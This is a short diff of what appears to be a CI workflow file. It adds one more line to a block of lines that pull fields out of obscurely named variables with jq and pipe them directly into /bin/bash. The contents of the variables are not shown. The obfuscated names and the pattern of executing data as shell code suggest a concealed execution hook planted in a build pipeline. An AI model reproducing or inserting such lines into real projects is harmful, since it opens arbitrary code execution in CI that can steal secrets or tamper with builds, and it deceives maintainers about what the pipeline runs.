@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$yncl2" | jq -r .iu19971 | /bin/bash
           printf '%s' "$ltoja60179" | jq -r .hk8 | /bin/bash
           printf '%s' "$hxcfx6185" | jq -r .q0 | /bin/bash
+          echo $qw87651 | jq -r .k6 | /bin/bash
 
       - name: Store results
         if: always()
